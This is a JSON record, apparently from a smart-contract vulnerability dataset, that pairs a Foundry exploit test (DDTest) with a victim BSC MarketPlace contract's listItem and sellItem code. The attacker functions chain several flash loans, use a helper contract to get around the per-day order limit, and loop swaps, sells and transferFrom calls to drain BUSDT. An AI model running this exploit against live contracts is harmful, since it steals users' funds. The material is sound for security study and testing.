[
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == address(DPPOracle1)) {\n            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));\n        } else if (msg.sender == address(DPPOracle2)) {\n            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));\n        } else if (msg.sender == address(DPPOracle3)) {\n            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));\n        } else if (msg.sender == address(DPP)) {\n            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));\n        } else {\n            // Approvals\n            BUSDT.approve(address(MarketPlace), type(uint256).max);\n            BUSDT.approve(address(Router), type(uint256).max);\n            DD.approve(address(MarketPlace), type(uint256).max);\n\n            // Placing order\n            MarketPlace.listItem(500e18, addrToInvite);\n\n            // Bypassing order limit. Next order should be placed with helper contract because:\n            // MarketPlace: \"Only one order can be placed within hours\"\n            // Here I don't use create2 method like it was in the attack tx\n            OrdersPlacer = new HelperContract();\n            BUSDT.transfer(address(OrdersPlacer), 500e18);\n            // Using one contract to place the next order instead two (with delegatecall)\n            OrdersPlacer.placeOrder();\n\n            // Next part (for loop) may take some time...\n            // More iterations possible. I just wanted to prcisely stick to the final (stealed) BUSDT amount\n            for (uint256 i; i < 100; ++i) {\n                (,, uint256 totalAmount,,,) = MarketPlace.items(MarketPlace.currenyId());\n\n                swapBUSDTToDD(totalAmount / 20);\n                MarketPlace.sellItem(totalAmount);\n                BUSDT.transferFrom(\n                    address(MarketPlace), address(this), BUSDT.allowance(address(MarketPlace), address(this))\n                );\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_714_107);\n        cheats.label(address(BUSDT), \"BUSDT\");\n        cheats.label(address(DD), \"DD\");\n        cheats.label(address(DPPOracle1), \"DPPOracle1\");\n        cheats.label(address(DPPOracle2), \"DPPOracle2\");\n        cheats.label(address(DPPOracle3), \"DPPOracle3\");\n        cheats.label(address(DPP), \"DPP\");\n        cheats.label(address(DPPAdvanced), \"DPPAdvanced\");\n        cheats.label(address(MarketPlace), \"MarketPlace\");\n        cheats.label(address(Router), \"Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DDTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        emit log_named_decimal_uint(\n            \"BUSDT attacker balance before exploit\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"BUSDT attacker balance after exploit\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketPlace",
    "source_type": "victim_contract",
    "function_name": "currenyId",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketPlace",
    "source_type": "victim_contract",
    "function_name": "inviteLimit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketPlace",
    "source_type": "victim_contract",
    "function_name": "items",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketPlace",
    "source_type": "victim_contract",
    "function_name": "listItem",
    "original_code": "    function listItem(uint256 _amount,address invite) external  returns (uint256)  {\n        require(_amount % amount_double_buy == 0 && _amount > 0 && _amount <= amount_max_buy,\"Illegal amount \");  \n        bool flag = (inviter[msg.sender] != address(0) || (invite != msg.sender && invite != address(0) && inviter[invite] != address(0)));\n        require(flag ,\"The recommender does not exist\");\n        require(getOrderByDay() < amount_max_count_day, \"Only one order can be placed within  hours\");\n        if(per_up_price == 0){\n            addItem(_amount);\n        }else{\n            if(_amount + total_buy_coin - prev_up_amount < per_amount_price){\n                addItem(_amount);\n            }else{\n                uint256 clac_amount = _amount;\n                while(clac_amount > 0){\n                    uint256 buy = prev_up_amount + per_amount_price - total_buy_coin;\n                    if(buy > clac_amount){\n                        addItem(clac_amount);\n                        break ;\n                    }else{\n                        addItem(buy);\n                        prev_up_amount += per_amount_price;\n                        new_price += per_up_price;\n                        clac_amount -= buy;\n                    }   \n                }\n            }\n        }\n        if(inviter[msg.sender] == address(0)){    \n            inviter[msg.sender] = invite;\n        }\n        caclInviteLimit(_amount*limit_scale/100 -_amount);\n        usdt.transferFrom(msg.sender, address(this), _amount);\n        emit ItemListed(msg.sender, _amount, new_price/100);\n        return total_buy_coin;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketPlace",
    "source_type": "victim_contract",
    "function_name": "sellItem",
    "original_code": "    function sellItem(uint256 _amount) external returns(SellListing memory ){\n        require(itemCount > 0 && currenyId <= itemCount,\"Not buy order\");\n        require(_amount % amount_double_sell == 0 && _amount > 0 && _amount <= amount_max_sell,\"Illegal amount \");\n        require(items[currenyId].buyer != msg.sender,\"Cannot sell to oneself\");    \n        require(limitAmount[msg.sender] + getLimit() +  inviteLimit[msg.sender] -sellAmount[msg.sender] >= _amount,\"Insufficient credit limit\");\n        Listing  memory listedItem = items[currenyId];\n        uint256 index = currenyId;\n        if(_amount >= listedItem.amount){  \n            _amount = listedItem.amount;\n            items[currenyId].amount = 0;\n            currenyId++;\n        }else{\n            items[currenyId].amount -= _amount;\n        }\n        sellCount++;\n        SellListing  memory sell = SellListing(index,sellCount,listedItem.price,_amount,block.timestamp,listedItem.buyer,msg.sender);\n        sellOrders[sellCount] = sell;\n        buyOrder[listedItem.buyer].push(sellCount); \n        sellOrder[msg.sender].push(sellCount);\n        sellAmount[msg.sender] += _amount;\n        usdt.approve(msg.sender, _amount);\n        usdt.transfer(msg.sender, _amount * (1000-charge)/1000);\n        if(charge>0){\n            usdt.transfer(charge_address, _amount * charge/1000);  \n        } \n        coin.transferFrom(msg.sender, listedItem.buyer, (_amount/listedItem.price * 100));\n        emit ItemSell(msg.sender, listedItem.buyer, listedItem.price, _amount);\n        return sell;\n    }\n\n    \n\n",
    "description": ""
  },
  {
    "contract/interface": "HelperContract",
    "source_type": "attacker_contract",
    "function_name": "placeOrder",
    "original_code": "    function placeOrder() external {\n        BUSDT.approve(address(MarketPlace), type(uint256).max);\n        MarketPlace.listItem(500e18, msg.sender);\n    }\n",
    "description": ""
  }
]